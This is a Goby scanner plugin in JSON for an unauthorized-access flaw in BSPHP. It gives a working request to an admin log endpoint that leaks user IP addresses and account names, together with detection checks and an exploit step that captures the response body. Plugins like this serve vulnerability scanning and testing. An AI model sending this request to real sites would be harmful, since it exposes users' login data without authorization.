{
      "Name": "BSPHP index.php unauthorized access information",
      "Level": "3",
      "Tags": [
            "infoleak"
      ],
      "GobyQuery": "header=\"Pragma\"",
      "Description": "BSPHP 存在未授权访问 泄露用户 IP 和 账户名信息",
      "Product": "",
      "Homepage": "https://gobies.org/",
      "Author": "gobysec@gmail.com",
      "Impact": "",
      "Recommendation": "",
      "References": [
            "https://gobies.org/"
      ],
      "HasExp": true,
      "ExpParams": null,
      "ExpTips": {
            "Type": "",
            "Content": ""
      },
      "ScanSteps": [
            "AND",
            {
                  "Request": {
                        "method": "GET",
                        "uri": "/admin/index.php?m=admin&c=log&a=table_json&json=get&soso_ok=1&t=user_login_log&page=1&limit=10&bsphptime=1600407394176&soso_id=1&soso=&DESC=0'",
                        "follow_redirect": true,
                        "header": {
                              "User-Agent": "Mozilla/5.0(X11; Linux x86_64; rv:12.0) Gecko/20100101 Firefox/12.0"
                        },
                        "data_type": "text",
                        "data": "",
                        "set_variable": []
                  },
                  "ResponseTest": {
                        "type": "group",
                        "operation": "AND",
                        "checks": [
                              {
                                    "type": "item",
                                    "variable": "$code",
                                    "operation": "==",
                                    "value": "200",
                                    "bz": ""
                              },
                              {
                                    "type": "item",
                                    "variable": "$body",
                                    "operation": "contains",
                                    "value": "user",
                                    "bz": ""
                              }
                        ]
                  },
                  "SetVariable": [
                        "output|lastbody|regex|"
                  ]
            }
      ],
      "ExploitSteps": [
            "AND",
            {
                  "Request": {
                        "method": "GET",
                        "uri": "/admin/index.php?m=admin&c=log&a=table_json&json=get&soso_ok=1&t=user_login_log&page=1&limit=10&bsphptime=1600407394176&soso_id=1&soso=&DESC=0'",
                        "follow_redirect": true,
                        "header": {
                              "User-Agent": "Mozilla/5.0(X11; Linux x86_64; rv:12.0) Gecko/20100101 Firefox/12.0"
                        },
                        "data_type": "text",
                        "data": "",
                        "set_variable": []
                  },
                  "ResponseTest": {
                        "type": "group",
                        "operation": "AND",
                        "checks": [
                              {
                                    "type": "item",
                                    "variable": "$code",
                                    "operation": "==",
                                    "value": "200",
                                    "bz": ""
                              },
                              {
                                    "type": "item",
                                    "variable": "$body",
                                    "operation": "contains",
                                    "value": "user",
                                    "bz": ""
                              }
                        ]
                  },
                  "SetVariable": [
                        "output|lastbody|regex|"
                  ]
            }
      ],
      "PostTime": "2022-06-01 23:48:04",
      "GobyVersion": "1.9.325"
}